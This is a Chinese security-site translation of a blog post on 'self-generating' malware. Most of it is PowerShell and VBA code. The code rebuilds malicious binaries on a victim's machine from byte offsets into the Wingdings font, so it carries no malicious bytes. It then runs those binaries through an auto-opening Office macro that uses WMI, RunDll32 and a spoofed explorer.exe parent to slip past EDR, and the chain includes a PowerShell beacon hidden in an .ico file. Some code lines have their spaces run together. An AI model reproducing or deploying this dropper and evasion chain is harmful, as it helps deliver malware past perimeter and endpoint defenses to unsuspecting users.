**严正声明：本文内容仅用于教育目的和技术讨论，严禁用于非法用途。**

## 前言

**在不需要任何其他依赖组件的情况下完成入侵，指的就是利用目标系统中已安装的合法程序来进行恶意活动。在这种场景下，攻击者无需通过嵌入代码或Payload来传递外部文件，因为所有需要用到的执行载体在目标主机上都已经准备好了。**

![](https://image.3001.net/images/20181128/1543410155_5bfe91eb30d12.png!small)

## 步骤

在大多数情况下，一般的网络攻击需分成下面这三个步骤来进行：

### 1、 传递一个包含了Payload的文件，该文件需包含：

> a)需要执行的恶意代码
>
> b)或者
>
> c)非恶意代码，因为Payload可以在第三步中下载恶意组件

### 2、 诱使目标用户执行Payload；

### 3、 接下来，Payload将会：

> a)执行恶意组件
>
> b)或者
>
> c)下载恶意组件，然后执行

## 我的目标

我想要的解决方案应该满足以下几个条件：

> 1、 不包含任何恶意代码（甚至连恶意字节都没有），以绕过边界防护。
>
> 2、 不用下载任何恶意代码。
>
> 3、 最终执行恶意代码。

利用目标主机中的字体实现恶意软件自生成。

首先，我们需要找出每一个Windows操作系统版本都包含的一个组件，结果我找到了这个：

![](https://image.3001.net/images/20181128/1543410187_5bfe920b0ee60.png!small)

我对比了多个Windows版本中的Wingdings字体，然后发现这个字体在每个版本中都是一样的。

因此，我打算利用这个字体来实现我的“小”目标。应该怎么做呢？方法大致如下：

> 1、 在我们的主机上，收集我们恶意软件的字节数据。
>
> 2、 拿恶意软件的第一个字节跟Wingdings字体进行对比。
>
> 3、 在字体中找到了相同字节之后，在文本文件中记录它的位置。
>
> 4、 重复这个过程，直到找出恶意软件中包含的所有字节，然后在文本文件中记录下它们的位置。
>
> 5、 我们的Payload将包含每个字节所对应的Wingdings字体位置。
>
> 6、 在目标主机上，Payload将会使用Wingdings字体的位置来转换成字节数据，并构建恶意组件。

下面给出的是用来找出字节对应字体位置的PowerShell代码：

    
    
    $Font= "C:\Windows\Fonts\wingding.ttf"
    
    $Malware= "C:\Users\Administrator\Pictures\2.PNG"
    
     
    
    $fontArray= Get-Content $Font -Encoding Byte -ReadCount 0
    
    $malwareArray= Get-Content $Malware -Encoding Byte -ReadCount 0
    
    $offsetArray= @()
    
    foreach($byteInMalware in $malwareArray){
    
        $index = 0
    
        foreach ($byteInFont in $fontArray) {
    
           if ($byteInMalware -eq $byteInFont) {
    
                $offsetArray += $index
    
                break
    
            }
    
            $index++
    
        }    
    
    }

PowerShell代码将生成一个VBA代码，你可以将其插入到宏文件中，这份代码会生成一个包含字节位置信息的字节数组，它将负责构建你的恶意组件：

    
    
    $i=0
    
    $payload= ""
    
    $j=0
    
    $u=1
    
    $payDef= ""
    
    foreach($offsetin $offsetArray){  
    
     
    
        if($i -eq 30) {
    
            $payload = $payload + ", " +$offset + " _`r`n"
    
            $i=0       
    
            $j++ 
    
        }
    
        else {
    
           if($i -eq 0) {
    
            $payload = $payload + $offset       
    
           }
    
           else {
    
            $payload = $payload + ", " +$offset       
    
           }
    
        }
    
        if($j -eq 25)  {
    
            $payDef = $payDef + "`r`nFunctionccc$u()
    
    tt$u= Array($payload)
    
    ccc$u= tt$u
    
    EndFunction"
    
            $payload = ""
    
            $u++
    
            $j = 0
    
        }
    
        $i++
    
    }
    
    if($payload-ne ""){
    
    $payDef= $payDef + "`r`nFunction ccc$u()
    
    tt$u= Array($payload)
    
    ccc$u= tt$u
    
    EndFunction"
    
    }
    
     
    
    $payDef

运行结果如下：

![](https://image.3001.net/images/20181128/1543410243_5bfe9243338a3.png!small)

下面给出的VBA代码将使用我们之前所创建的字节数组来生成恶意组件。接下来，我们需要选择Explorer.exe来作为RunDll32.exe的父进程（目的是绕过EDR产品），然后通过RunDll32.exe来执行我们的恶意组件。如果你不想把文件写入磁盘的话，你可以尝试结合内存注入技术来使用。

VBA代码如下：

    
    
    [...]--> you array of bytes containing the position of necessary bytes in theWindings font.
    
     
    
    'exampleto join the bytes for the fist malicious component
    
     
    
        t1 = cc1
    
        t2 = cc2
    
        t3 = cc3
    
        t4 = cc4
    
        t5 = cc5
    
        t6 = cc6
    
        t7 = cc7
    
        t8 = cc8
    
        t9 = cc9
    
        t10 = cc10
    
        t11 = cc11
    
        t12 = cc12
    
        t13 = cc13
    
        t14 = cc14
    
        t15 = cc15
    
        t16 = cc16
    
        t17 = cc17
    
        t18 = cc18
    
     
    
        ttt = Split(Join(t1, ",") &"," & Join(t2, ",") & "," & Join(t3,",") & "," & Join(t4, ",") &"," & Join(t5, ",") & "," & Join(t6,",") & "," & Join(t7, ",") &"," & Join(t8, ",") & "," & Join(t9,",") _
    
         & "," & Join(t10,",") & "," & Join(t11, ",") &"," & Join(t12, ",") & "," &Join(t13, ",") & "," & Join(t14, ",")& "," & Join(t15, ",") & "," &Join(t16, ",") & "," & Join(t17, ",")& "," & Join(t18, ","), ",")
    
     
    
     
    
    [...]
    
     
    
     
    
        Dim nb As Integer
    
        Dim nb2 As Integer
    
        nb = UBound(ttt) - LBound(ttt) + 1 'ttt isa joined byte array
    
        nb2 = UBound(tt) - LBound(tt) + 1
    
        nb3 = UBound(ttttttt) - LBound(ttttttt) + 1
    
        Dim intFileNumber As Integer
    
        Dim i As Integer
    
        Dim j As Integer
    
        Dim lngFileSize As Long
    
        Dim lngFileSize2 As Long
    
        Dim strBuffer As String
    
        Dim strBuffer2 As String
    
        Dim lngCharNumber As Long
    
        Dim lngCharNumber2 As Long
    
        Dim strCharacter As String * 1
    
        Dim strCharacter2 As String * 1
    
        Dim strFileName As String
    
        Dim strFileName2 As String
    
        Dim offset() As Variant
    
            
    
        strFileName ="C:\Windows\Fonts\wingding.ttf"
    
        intFileNumber = FreeFile
    
        Open strFileName For Binary Access ReadShared As #intFileNumber
    
            lngFileSize = LOF(intFileNumber)
    
            strBuffer = Space$(lngFileSize)
    
            Get #intFileNumber, , strBuffer
    
        Close #intFileNumber
    
     
    
       Dim nFileNum As Long
    
       Dim sFilename As String
    
       Dim ind As Long
    
       sFilename2 ="C:\Users\Public\Documents\changeMyParent.exe" ' crafted binary thatwill be use to select the parent of rundll32
    
       sFilename ="C:\Users\Public\Documents\runPoshCode.dll" ' .DLL that will runpowershell beacon from an image
    
       sFilename3 ="C:\Users\Public\Documents\BEACON.ico" ' malicious powershell beaconregistered in an .ICO
    
       nFileNum = FreeFile
    
       ' a loop would be better ;-)
    
       Open sFilename2 For Binary Lock Read WriteAs #nFileNum
    
           For lngCharNumber = 0 To nb - 1
    
            ind = lngCharNumber + 1
    
            off = ttt(lngCharNumber)
    
            strCharacter = Mid(strBuffer, off, 1)
    
            Put #nFileNum, ind, strCharacter
    
           Next lngCharNumber
    
       Close #nFileNum
    
       
    
       nFileNum = FreeFile
    
       Open sFilename For Binary Lock Read Write As#nFileNum
    
           For lngCharNumber = 0 To nb2 - 1
    
            ind = lngCharNumber + 1
    
            off = tt(lngCharNumber)
    
            strCharacter = Mid(strBuffer, off, 1)
    
            Put #nFileNum, ind, strCharacter
    
           Next lngCharNumber
    
       Close #nFileNum
    
       
    
       nFileNum = FreeFile
    
       Open sFilename3 For Binary Lock Read WriteAs #nFileNum
    
           For lngCharNumber = 0 To nb3 - 1
    
            ind = lngCharNumber + 1
    
            off = ttttttt(lngCharNumber)
    
            strCharacter = Mid(strBuffer, off, 1)
    
            Put #nFileNum, ind, strCharacter
    
           Next lngCharNumber
    
       Close #nFileNum
    
       rr
    
    EndSub
    
     
    
    Subrr()
    
      Dim xx As String
    
      Dim oihfasf As Object, eopuf As Object, kdjAs Object
    
      Dim oDic As Object, a() As Variant
    
      Dim pskaf As Integer
    
     
    
      Set oDic =CreateObject("Scripting.Dictionary")
    
     
    
      xx = "."
    
     
    
      Set oihfasf =GetObject("winmgmts:\\" _
    
          & xx & "\root\CIMV2")
    
      Set eopuf = oihfasf.ExecQuery _
    
          ("Select Name, ProcessID FROMWin32_Process", , 48)
    
     
    
      For Each kdj In eopuf
    
          If(kdj.Properties_("Name").Value) = "explorer.exe" Then
    
              pskaf =(kdj.Properties_("ProcessID").Value)
    
          End If
    
      Next
    
    Dim tAs Date
    
     
    
    Dimcnt As Long
    
    Dimarr(2) As Byte
    
     
    
    Dimxl As String
    
    xl ="C:\Users\Public\Documents\changeMyParent.exe ""C:\Windows\system32\RunDll32.exeC:\Users\Public\Documents\runPoshCode.dll,ComputeFmMediaType -fC:\Users\Public\Documents\BEACON.ico"" " & pskafxx ="."
    
    Setow = GetObject("winmgmts:\\" & xx & "\Root\cimv2")
    
    Setos = ow.Get("Win32_ProcessStartup")
    
    Setoc = os.SpawnInstance_
    
    Setop = GetObject("winmgmts:\\" & xx &"\root\cimv2:Win32_Process")
    
    op.Createxl, Null, oc, aslh
    
     
    
    EndSub
    
    SubAutoOpen()
    
        cc
    
    EndSub
    
    SubWorkbook_Open()
    
        cc
    
    EndSub

 ***
参考来源：[sysadminconcombre](http://sysadminconcombre.blogspot.com/2018/11/golem-malware-malware-hiding-in-your.html)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

